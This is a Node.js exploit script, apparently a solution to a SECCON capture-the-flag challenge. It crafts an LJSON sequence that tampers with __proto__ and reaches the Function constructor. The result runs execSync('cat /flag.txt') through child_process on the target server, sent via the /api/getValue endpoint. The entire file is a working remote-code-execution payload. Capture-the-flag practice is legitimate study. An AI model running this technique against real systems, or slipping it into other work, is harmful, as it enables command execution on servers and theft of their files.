const LJSON = require("ljson");
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_URL = process.env.SECCON_URL || fail("SECCON_URL not found");

const code =
  'return global.process.mainModule.constructor._load("child_process").execSync("cat /flag.txt").toString()';

let evilSequence = LJSON.stringify(($, n) =>
  $(
    ",",
    $("set", $("self"), "__proto__", $),
    $("constructor", code)()
  )
);

const params = new URLSearchParams({
  sequence: evilSequence,
  n: 0,
});

const main = async () => {
  const text = await (
    await fetch(`${SECCON_URL}/api/getValue?${params}`)
  ).text();
  console.log(text);
};
main();
